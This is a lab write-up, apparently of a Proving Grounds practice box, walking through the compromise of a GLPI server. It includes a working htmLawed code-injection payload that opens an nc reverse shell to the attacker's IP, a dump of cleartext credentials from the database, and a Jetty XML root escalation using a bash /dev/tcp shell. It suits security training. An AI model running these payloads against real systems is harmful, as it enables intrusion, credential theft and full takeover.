---
layout: default
title: GLPI
parent: Proving Grounds Practice - Linux
nav_order: 10
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/glpi]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.246.242

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/glpi/index.png)

This took a lot of enumeration after several failed attempts at other exploits for _glpi_.

The path _/vendor/htmlawed/htmlawed/htmLawedTest.php_ provides the _HTMLawed_ version 1.2.6 interface that is vulnerable to code injection.

![htmlawed](../../../assets/images/ctfs/proving_grounds/glpi/htmlawed.png)

Sending the following payload via Burp provides POC for code injection.

```bash
text=call_user_func&hhook=array_map&hexec=system&sid=45clbc3klvavj44786c8664leq&spec[0]=&spec[1]=id
```

![burp1](../../../assets/images/ctfs/proving_grounds/glpi/burp1.png)

# Exploitation

---

We can exploit the code injection vulnerability with the below payload to secure a reverse shell on our netcat listener.

```bash
text=call_user_func&hhook=array_map&hexec=system&sid=45clbc3klvavj44786c8664leq&spec[0]=&spec[1]=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%2080%201%3E%2Ftmp%2Fl
```

![burp2](../../../assets/images/ctfs/proving_grounds/glpi/burp2.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/glpi]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.246.242] 60438
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Check config_db.php

```bash
www-data@glpi:/var/www/glpi/config$ cat confi
cat config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'glpi_db_password';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}

```

## Enumerate Tables on GLPI Database

While there is not much useful information in the _glpi_users_ table, there are some clear text credentials in the _glpi_itilfollowups_ table.

```bash
 glpi_itilfollowups

mysql> select * from glpi_itilfollowups;
select * from glpi_itilfollowups;
+----+----------+----------+---------------------+----------+-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------------+---------------------+---------------------+-------------------+----------------+-------------------+
| id | itemtype | items_id | date                | users_id | users_id_editor | content                                                                                                                                                                                                                                                 | is_private | requesttypes_id | date_mod            | date_creation       | timeline_position | sourceitems_id | sourceof_items_id |
+----+----------+----------+---------------------+----------+-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------------+---------------------+---------------------+-------------------+----------------+-------------------+
|  1 | Ticket   |        1 | 2022-10-08 20:57:14 |        2 |               0 | &#60;p&#62;Hello Betty,&#60;/p&#62;
&#60;p&#62;i changed your password to : SnowboardSkateboardRoller234&#60;/p&#62;
&#60;p&#62;Please change it again as soon as you can.&#60;/p&#62;
&#60;p&#62;regards.&#60;/p&#62;
&#60;p&#62;Lucas&#60;/p&#62; |          0 |               1 | 2022-10-08 20:57:14 | 2022-10-08 20:57:14 |                 4 |              0 |                 0 |
+----+----------+----------+---------------------+----------+-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------------+---------------------+---------------------+-------------------+----------------+-------------------+
1 row in set (0.01 sec)

```

## Pivot to Betty via SSH

We have the credentials for user _betty_ _SnowboardSkateboardRoller234_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/glpi]
└─$ ssh betty@192.168.246.242

$ id
uid=1000(betty) gid=1000(betty) groups=1000(betty)

```

## Exploit Ownership of Jetty

Earlier enumeration showed the root user running _/usr/bin/java_ on _/opt/jetty/jetty-base_

```bash
betty@glpi:/opt/jetty/jetty-base$ ps -aux | grep -i 'root'

root        1087  0.0  1.0 107920 20696 ?        Ssl  03:19   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1260  0.2  3.9 3062860 80224 ?       Sl   03:19   0:03 /usr/bin/java -Djava.io.tmpdir=/tmp -Djetty.home=/opt/jetty -Djetty.base=/opt/jetty/jetty-base --class-path /opt/jetty/jetty-base/resources:/opt/jetty/lib/logging/slf4j-api-2.0.0.jar:/opt/jetty/lib/logging/jetty-slf4j-impl-11.0.12.jar:/opt/jetty/lib/jetty-jakarta-servlet-api-5.0.2.jar:/opt/jetty/lib/jetty-http-11.0.12.jar:/opt/jetty/lib/jetty-server-11.0.12.jar:/opt/jetty/lib/jetty-xml-11.0.12.jar:/opt/jetty/lib/jetty-util-11.0.12.jar:/opt/jetty/lib/jetty-io-11.0.12.jar:/opt/jetty/lib/jetty-security-11.0.12.jar:/opt/jetty/lib/jetty-servlet-11.0.12.jar:/opt/jetty/lib/jetty-webapp-11.0.12.jar:/opt/jetty/lib/jetty-deploy-11.0.12.jar org.eclipse.jetty.xml.XmlConfiguration java.version=11.0.17 java.version.major=11 java.version.micro=17 java.version.minor=0 java.version.platform=11 jetty.base=/opt/jetty/jetty-base jetty.base.uri=file:///opt/jetty/jetty-base jetty.home=/opt/jetty jetty.home.uri=file:///opt/jetty jetty.state=/opt/jetty/jetty-base/jetty.state jetty.webapp.addServerClasses=org.eclipse.jetty.logging.,${jetty.home.uri}/lib/logging/,org.slf4j. runtime.feature.alpn=true slf4j.version=2.0.0 /opt/jetty/etc/jetty-bytebufferpool.xml /opt/jetty/etc/jetty-threadpool.xml /opt/jetty/etc/jetty.xml /opt/jetty/etc/jetty-webapp.xml /opt/jetty/etc/jetty-deploy.xml /opt/jetty/etc/jetty-http.xml /opt/jetty/etc/jetty-started.xml start-log-file=/var/run/jetty/jetty-start.log
root        1470  0.0  1.4 384904 29344 ?        Ssl  03:19   0:00 /usr/libexec/fwupd/fwupd
root        1567  0.0  0.4 241220  8788 ?        Ssl  03:19   0:00 /usr/lib/upower/upowerd
root       26589  0.0  0.0      0     0 ?        I    03:33   0:00 [kworker/u4:1-events_unbound]

```

Betty owns _/opt/jetty/jetty-base/webapps_

```bash
betty@glpi:/opt/jetty/jetty-base$ ls -la
total 24
drwxr-xr-x 5 root  root  4096 Mar 21  2023 .
drwxr-xr-x 7 root  root  4096 Jan 25  2023 ..
-rw-r--r-- 1 root  root   104 Mar 21  2023 jetty.state
drwxr-xr-x 2 root  root  4096 Jan 25  2023 resources
drwxr-xr-x 2 root  root  4096 Jan 25  2023 start.d
drwxr-xr-x 2 betty betty 4096 Jan 25  2023 webapps

```

Subsequently, we can exploit the fact that anything placed in the _webapps_ directory will automatically run by doing the following:

1. place a reverse shell one-liner in _/tmp/run.sh_
2. place _run.xml_ in _webapps_ directory that calls _/tmp/run.sh_

```bash
# step 1; place reverse shell one-liner in _/tmp/run.sh_
echo "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" > /tmp/run.sh
chmod +x /tmp/run.sh

betty@glpi:/tmp$ cat /tmp/run.sh
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

# step 2;  place _run.xml_ in _webapps_ directory that calls _/tmp/run.sh_
betty@glpi:/opt/jetty/jetty-base/webapps$ nano run.xml

<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/tmp/run.sh</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>
```

Start second SSH session for Betty and catch the reverse shell on 0.0.0.0:4444

```bash
betty@glpi:~$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 55522
bash: cannot set terminal process group (1259): Inappropriate ioctl for device
bash: no job control in this shell
root@glpi:/opt/jetty/jetty-base# id
id
uid=0(root) gid=0(root) groups=0(root)

```
